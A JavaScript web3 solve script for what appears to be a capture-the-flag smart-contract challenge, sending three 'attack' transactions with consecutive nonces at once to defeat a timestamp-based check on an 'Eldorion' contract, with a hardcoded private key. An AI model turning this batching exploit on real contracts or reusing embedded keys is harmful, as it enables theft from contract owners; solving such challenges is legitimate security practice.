import Web3 from "web3"
import fs from "node:fs"

// Set up the Web3 instance
const web3 = new Web3('http://94.237.54.139:46063/');

// Check if connected to Ethereum
web3.eth.net.isListening()
  .then(() => console.log("Connected to Ethereum"))
  .catch(e => console.log("Error connecting to Ethereum", e));

// Wallet details
const privateKey = '0xd2e0b62806f8c5f81572f285456fb10824dbc38a75d6b888e05c2cb312045f52';
const walletAddress = '0x1621f1B47fcD98de3e15635FE47eab60CDEefdE9';
const targetContractAddress = '0x8926Fc8Ebe73931E7890D6df2Bfc9a085Ae051bf';
const setupContractAddress = '0x165329685A91087D33df9df4C0DDC691C4ccDAF3';

// Load ABI files
const eldAbi = JSON.parse(fs.readFileSync('Eldorion_sol_Eldorion.abi', 'utf8'));
const setupAbi = JSON.parse(fs.readFileSync('Setup_sol_Setup.abi', 'utf8'));

// Create contract instances
const eld = new web3.eth.Contract(eldAbi, targetContractAddress);
const setup = new web3.eth.Contract(setupAbi, setupContractAddress);

// Attack function
async function attack(n, i) {
  const nonce = await web3.eth.getTransactionCount(walletAddress);

  const txn = eld.methods.attack(n).encodeABI();

  const tx = {
    from: walletAddress,
    to: targetContractAddress,
    data: txn,
    gas: 100000,
    gasPrice: 0,
    nonce: nonce + i
  };

  const signedTx = await web3.eth.accounts.signTransaction(tx, privateKey);

  console.log("Signed transaction:", signedTx);

  // Uncomment the following lines to send the transaction and wait for the receipt
	const txHash = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
	return txHash;
  // const receipt = await web3.eth.getTransactionReceipt(txHash);
  // console.log("Transaction receipt:", receipt);
}

// Call the attack function with damage values
async function runAttacks() {
  const res = await Promise.all([
	  attack(100, 0n),
	  attack(100, 1n),
	  attack(100, 2n),
  ]);
  console.log("results", res);

  // Check the health and timestamp
  const health = await eld.methods.health().call();
  const lastTimestamp = await eld.methods.lastAttackTimestamp().call();
  console.log("Health:", health);
  console.log("Last attack timestamp:", lastTimestamp);

  // Check if the puzzle is solved
  const solved = await setup.methods.isSolved().call();
  console.log("Solved?", solved);
}

// Run the attacks
await runAttacks();
